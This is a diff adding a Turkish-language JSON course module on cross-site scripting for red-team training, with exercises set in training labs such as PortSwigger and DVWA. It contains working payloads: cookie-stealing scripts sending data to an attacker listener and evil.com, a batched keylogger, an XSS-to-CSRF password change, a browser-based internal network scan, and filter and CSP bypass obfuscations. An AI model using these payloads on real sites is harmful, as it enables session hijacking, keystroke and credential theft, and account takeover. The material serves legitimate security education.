@@ -1,0 +1,154 @@
+{
+  "id": "xss",
+  "slug": "xss",
+  "title": "XSS — Cross-Site Scripting",
+  "subtitle": "Tarayıcıyı Silaha Dönüştür",
+  "description": "XSS, web'in en yaygın zafiyetlerinden biri. Reflected → Stored → DOM farkından cookie çalmaya, keylogger'dan BeEF C2'ye tam saldırı zinciri. Mülakatların ve CTF'lerin vazgeçilmezi.",
+  "team": "red-team",
+  "category": "Web Uygulama Güvenliği",
+  "phase": "Exploitation",
+  "icon": "🕸️",
+  "color": "#a855f7",
+  "tags": ["xss", "cross-site-scripting", "reflected", "stored", "dom", "csp-bypass", "cookie-theft", "beef", "javascript", "payload", "web", "owasp"],
+  "modules": [
+    {
+      "id": "xss-temeller",
+      "title": "XSS Türleri ve Temel Payload'lar",
+      "description": "Reflected, Stored ve DOM-based XSS farkını anla, nerede aranır, nasıl test edilir.",
+      "difficulty": "beginner",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "xss-theory",
+          "type": "theory",
+          "title": "XSS Nedir ve 3 Türü",
+          "content": "**XSS (Cross-Site Scripting)**, saldırganın kurbanın tarayıcısında JavaScript çalıştırmasına olanak tanıyan bir zafiyettir. Sunucu değil — **kurbanın tarayıcısı** sömürülür.\n\n**Neden tehlikeli?**\n- Cookie ve session token çalma\n- Keylogger yerleştirme\n- Kamera/mikrofon erişimi (izin varsa)\n- Phishing sayfası enjeksiyonu\n- CSRF token çalma\n- Internal ağ tarama (tarayıcı üzerinden)\n\n---\n\n### 3 XSS Türü\n\n**1. Reflected XSS** (En yaygın)\n- Payload URL'de bulunur, sunucu bunu yanıta yansıtır\n- Kurban linki tıkladığında tek sefer çalışır\n- Kalıcı değil — her çalışma için link gerekli\n```\nhttps://hedef.com/search?q=<script>alert(1)</script>\n```\n\n**2. Stored XSS** (En tehlikeli)\n- Payload veritabanına kaydedilir, her sayfayı ziyaret eden kurban etkilen\n- Yorum, profil, mesaj kutusu vb.\n- Admin görmüşse → hesap devralma mümkün\n```\nYorum: Güzel yazı! <script>document.location='http://evil.com?c='+document.cookie</script>\n```\n\n**3. DOM-based XSS**\n- JavaScript, URL fragment (#) veya DOM'dan alınan veriyi güvenli olmadan işler\n- Sunucu hiç görmez — tamamen client-side\n```javascript\n// Zafiyet: document.write(location.hash)\n// URL: https://hedef.com/page#<img src=x onerror=alert(1)>\n```\n\n**OWASP sıralaması:** A03:2021 — Injection kategorisinde, XSS ayrıca A05 (Security Misconfiguration) ile bağlantılı."
+        },
+        {
+          "id": "xss-tespiti",
+          "type": "commands",
+          "title": "XSS Tespiti — Nereye Bakılır, Ne Denenir?",
+          "commands": [
+            {
+              "command": "# XSS'e açık olabilecek yerler:\n# - Arama kutusu: ?q=PAYLOAD\n# - Hata mesajları: ?error=PAYLOAD\n# - URL path: /user/PAYLOAD/profile\n# - HTTP Header'lar: User-Agent, Referer, X-Forwarded-For\n# - Form inputları: ad, yorum, e-posta, şehir\n# - JSON parametreleri: {\"name\": \"PAYLOAD\"}\n\n# İlk test payload'ları:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"\"><script>alert(1)</script>\n';alert(1)//\n\\';alert(1)//",
+              "description": "XSS için her input alanını ve her URL parametresini test et. Önce alert(1) ile varlığını doğrula.",
+              "tip": "alert(1) yerine alert(document.domain) kullan — hangi domain'de çalıştığını gösterir, scope'u netleştirir."
+            },
+            {
+              "command": "# Burp Suite ile sistematik XSS tarama:\n# 1. Hedefi Burp'e al (Proxy)\n# 2. Parametre içeren isteği Repeater'a gönder\n# 3. Parametre değerini payload ile değiştir\n# 4. Response'ta payload yansıdı mı kontrol et\n\n# Burp Intruder ile fuzzing:\n# Positions: q=§PAYLOAD§\n# Wordlist: /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt\n\n# Yanıtta ne arıyoruz:\n# <script>alert(1)</script>  → direkt yansıma (encode edilmemiş)\n# &lt;script&gt;             → HTML encode edilmiş (muhtemelen güvenli)\n# \\u003cscript\\u003e        → Unicode encode (JS context'te tehlikeli olabilir)",
+              "description": "Burp ile sistematik XSS — önce yansıma var mı, sonra encode edilmiş mi kontrol et.",
+              "tip": "Ctrl+F ile response'ta payload'ı ara — 'alert' kelimesi encode edilmemiş görünüyorsa XSS muhtemelen var."
+            },
+            {
+              "command": "# Context analizi — payload nerede yansıyor?\n\n# HTML context'te:\n# <p>Merhaba PAYLOAD</p>  →  <script>alert(1)</script> dene\n\n# HTML attribute içinde:\n# <input value='PAYLOAD'>  →  ' onmouseover='alert(1)   veya   \" autofocus onfocus=\"alert(1)\"\n\n# JavaScript string içinde:\n# var x = 'PAYLOAD';      →  ';alert(1)//   veya   \\';alert(1)//\n\n# URL context'te:\n# <a href='PAYLOAD'>      →  javascript:alert(1)\n\n# CSS context'te:\n# style='color:PAYLOAD'   →  red;} body{background:url(javascript:alert(1))}",
+              "description": "XSS context analizi — payload'ın HTML'de nerede yansıdığına göre farklı teknik kullan.",
+              "tip": "Burp'te Response sekmesinde 'Render' ile tarayıcı görünümüne geç — sayfayı görsel olarak kontrol et."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "xss-exploitation",
+      "title": "XSS Sömürüsü — Cookie Çalma ve Keylogger",
+      "description": "alert(1)'den ötesi: gerçek saldırı payload'ları ile oturum çalma, keylogger ve CSRF token hırsızlığı.",
+      "difficulty": "intermediate",
+      "duration": "35 dk",
+      "sections": [
+        {
+          "id": "xss-exploit-komutlar",
+          "type": "commands",
+          "title": "Cookie Çalma ve Oturum Hırsızlığı",
+          "commands": [
+            {
+              "command": "# 1. Kali'de basit HTTP dinleyici kur:\npython3 -m http.server 8888\n\n# 2. XSS payload'ı — cookie'yi Kali'ye gönder:\n<script>document.location='http://10.10.14.5:8888/steal?c='+document.cookie</script>\n\n# Alternatif — fetch ile (daha modern):\n<script>fetch('http://10.10.14.5:8888/?c='+btoa(document.cookie))</script>\n\n# Kısa payload (karakter sınırı varsa):\n<img src=x onerror=\"this.src='http://10.10.14.5:8888/?'+document.cookie\">",
+              "description": "Stored XSS ile cookie çalma — payload yoruma/profile kaydet, admin görmesini bekle.",
+              "output": "# Kali HTTP server logları:\n10.10.10.50 - - [GET] /?c=session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.xxx\n\n# Cookie'yi Burp'e yapıştır:\n# Session cookie'yi kendi tarayıcında değiştir → admin oturumu",
+              "tip": "HttpOnly flag set ise document.cookie boş döner — cookie JS'den erişilemez. Ama form çalma, keylogger, CSRF hala mümkün."
+            },
+            {
+              "command": "# Gelişmiş payload — birden fazla eylemi zincirle:\n<script>\n// 1. Cookie çal\nvar c = document.cookie;\n// 2. Admin şifre sıfırlama formunu doldur\n// 3. Gizli isteği gönder\nfetch('/admin/change-password', {\n  method: 'POST',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: 'new_password=hacked123&csrf=' + document.querySelector('[name=csrf]').value\n});\n</script>",
+              "description": "XSS + CSRF birleştirme — admin sayfasındaki CSRF token'ı çal, parola değiştirme isteği gönder.",
+              "tip": "CSRF token'ı sayfadan çekmek için: document.querySelector('[name=_token]').value veya document.forms[0].csrf.value"
+            },
+            {
+              "command": "# Keylogger payload:\n<script>\ndocument.onkeypress = function(e) {\n  fetch('http://10.10.14.5:8888/?k=' + e.key);\n};\n</script>\n\n# Daha gizli versiyon — batch gönderim:\n<script>\nvar log = '';\ndocument.onkeypress = function(e) { log += e.key; };\nsetInterval(function() {\n  if(log) {\n    fetch('http://10.10.14.5:8888/?k=' + btoa(log));\n    log = '';\n  }\n}, 2000);\n</script>",
+              "description": "JavaScript keylogger — kurbanın tuş vuruşlarını yakala ve sunucuna gönder.",
+              "warning": "Bu teknikler sadece yetkili pentest veya kendi kurduğun lab ortamında kullanılabilir. İzinsiz kullanım yasadışıdır.",
+              "tip": "btoa() Base64 encode eder — tuş basımları URL'de gözükmez, daha az şüphe uyandırır."
+            },
+            {
+              "command": "# XSS ile iç ağ tarama (tarayıcı pivot):\n<script>\n// Kurbanın tarayıcısından iç ağ IP'lerini tara\nvar ips = ['192.168.1.1','192.168.1.254','10.0.0.1'];\nips.forEach(function(ip) {\n  var img = new Image();\n  img.onload  = function() { fetch('http://10.10.14.5:8888/?up='  + ip); };\n  img.onerror = function() { fetch('http://10.10.14.5:8888/?down=' + ip); };\n  img.src = 'http://' + ip + '/favicon.ico';\n});\n</script>",
+              "description": "Tarayıcı üzerinden iç ağ keşfi — kurbanın tarayıcısı iç ağa erişebildiği için saldırgan göremediği ağı görür.",
+              "tip": "Bu teknik, kurban iç ağdayken (şirket VPN) saldırgana iç ağ görünümü sağlar. SSRF'in istemci tarafı versiyonu."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "xss-bypass-csp",
+      "title": "Filtre ve CSP Bypass Teknikleri",
+      "description": "WAF'ları ve Content Security Policy'yi atlatmak için encoding, obfuscation ve alternatif payload'lar.",
+      "difficulty": "advanced",
+      "duration": "35 dk",
+      "sections": [
+        {
+          "id": "bypass-komutlar",
+          "type": "commands",
+          "title": "WAF ve Filtre Bypass Payload'ları",
+          "commands": [
+            {
+              "command": "# 'script' kelimesi filtreleniyorsa:\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<input autofocus onfocus=alert(1)>\n<details open ontoggle=alert(1)>\n<video src=x onerror=alert(1)>\n<audio src=x onerror=alert(1)>\n<iframe srcdoc='<script>alert(1)</script>'>\n\n# Büyük/küçük harf karışımı:\n<ScRiPt>alert(1)</sCrIpT>\n\n# HTML entity encode:\n<script>alert&#40;1&#41;</script>\n<script>&#97;lert(1)</script>",
+              "description": "Kelime tabanlı filtreler ve büyük/küçük harf filtreleri için alternatif payload'lar.",
+              "tip": "WAF genellikle <script> etiketini bloklar. Event handler'lar (onerror, onload, onfocus) çok daha az filtrelenir."
+            },
+            {
+              "command": "# JavaScript string obfuscation:\nalert(1)                       → eval('ale'+'rt(1)')\nalert(1)                       → eval(atob('YWxlcnQoMSk='))\nalert(document.domain)         → eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))\n\n# HTML entity encoding:\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>\n\n# URL encoding (attribute içinde):\n<a href=javascript:%61%6c%65%72%74%28%31%29>tıkla</a>\n\n# Template literals:\n<script>eval`alert\\x281\\x29`</script>",
+              "description": "JavaScript obfuscation ile WAF imza tespitini atlatma.",
+              "tip": "atob() Base64 decode eder: atob('YWxlcnQoMSk=') → 'alert(1)'. Payload'ı base64'e çevir, atob() ile decode et ve eval et."
+            },
+            {
+              "command": "# CSP (Content Security Policy) analizi:\n# Response header'da ara:\ncurl -I https://hedef.com | grep -i 'content-security-policy'\n\n# Örnek CSP:\n# Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com\n\n# CSP bypass 1 — güvenilir domain'e XSS varsa:\n# https://trusted.com/xss?callback=<payload> → bu hedef için de çalışır\n\n# CSP bypass 2 — unsafe-inline izni:\n# script-src 'self' 'unsafe-inline' → direkt <script> çalışır\n\n# CSP bypass 3 — JSONP endpoint:\n# script-src'de *.google.com → accounts.google.com/o/oauth2/postmessageRelay?... JSONP\n\n# CSP bypass 4 — base-uri eksikse:\n<base href='http://evil.com/'>  → göreli URL'ler evil.com'a yönlenir",
+              "description": "CSP analizi ve yaygın bypass vektörleri — CSP yanlış yapılandırılmışsa etkisizleşir.",
+              "tip": "csp-evaluator.withgoogle.com — Google'ın CSP analiz aracı, zafiyetleri otomatik gösterir."
+            },
+            {
+              "command": "# DOM-based XSS tespit ve sömürüsü:\n# Tehlikeli sink'ler (veriyi DOM'a yazan fonksiyonlar):\n# document.write(), innerHTML, outerHTML\n# eval(), setTimeout(string), setInterval(string)\n# location.href, location.replace()\n\n# Tehlikeli source'lar (kullanıcı verisi alan yerler):\n# location.hash, location.search, location.pathname\n# document.referrer, document.URL\n# window.name, postMessage veri\n\n# Örnek zafiyet:\n# JavaScript: document.getElementById('out').innerHTML = location.hash.slice(1);\n# URL: https://hedef.com/page#<img src=x onerror=alert(1)>\n\n# Burp'te DOM XSS araması:\n# DOM Invader extension kur (BApp Store)\n# URL: https://hedef.com/page#DOM_INVADER_INJECTION\n# Extension tüm DOM sink'lerini izler",
+              "description": "DOM-based XSS — sunucu hiç görmez, trafik analizinde görünmez, WAF'ı atlatır.",
+              "tip": "DOM Invader (Burp Suite extension) DOM-based XSS'i otomatik tespit eder. BApp Store'dan kur."
+            }
+          ]
+        },
+        {
+          "id": "xss-lab",
+          "type": "lab",
+          "title": "Lab: Stored XSS ile Admin Cookie Çalma",
+          "scenario": {
+            "title": "XSS → Session Hijacking → Admin Account Takeover",
+            "objective": "Stored XSS zafiyeti bulunan bir web uygulamasında yorum formuna cookie çalan payload yerleştir, admin gördüğünde cookie'yi kap ve admin oturumu devral.",
+            "environment": "PortSwigger Web Security Academy: 'Stored XSS into HTML context with nothing encoded' | DVWA: XSS (Stored) bölümü | TryHackMe: 'Cross-site Scripting' odası | PentesterLab: XSS series",
+            "difficulty": "intermediate",
+            "steps": [
+              "Kali'de HTTP dinleyiciyi başlat: python3 -m http.server 8888",
+              "Yorum/input formunu bul, normal metin girerek yanıtta nasıl yansıdığına bak",
+              "Basit test: <script>alert(document.domain)</script> — alert geldi mi?",
+              "Cookie çalan payload'ı hazırla ve forma gönder",
+              "Uygulamayı admin olarak giriş yap (başka tarayıcı/pencere) ve yorumun olduğu sayfaya git",
+              "Kali HTTP server loglarında cookie'yi al",
+              "Kendi tarayıcında Cookie'yi değiştir (Burp veya browser dev tools)",
+              "/admin veya /dashboard gibi korunan alana eriş"
+            ],
+            "hints": [
+              "HttpOnly flag varsa cookie JS'den görünmez — ama form içeriği, CSRF token veya sayfayı Kali'ye POST etmek hala mümkün",
+              "Payload uzunluk kısıtı varsa: <img src=x onerror='fetch(\"//KALI:8888/\"+btoa(cookie))'>",
+              "Admin cookie'yi nasıl set edersin: DevTools > Application > Cookies > değiştir veya Burp Intercept > Cookie header'ı değiştir"
+            ],
+            "flag": "Admin panelindeki flag veya 'Congratulations' mesajı",
+            "defenseNote": "Savunma: Output encoding (HTML entity encode) — tüm kullanıcı verilerini <, >, \", ' için encode et. HttpOnly cookie flag — JS'den cookie erişimini engeller. Strict CSP tanımla: script-src 'self'. Input validation (whitelist). DOMPurify kütüphanesi ile HTML sanitization."
+          }
+        }
+      ]
+    }
+  ]
+}
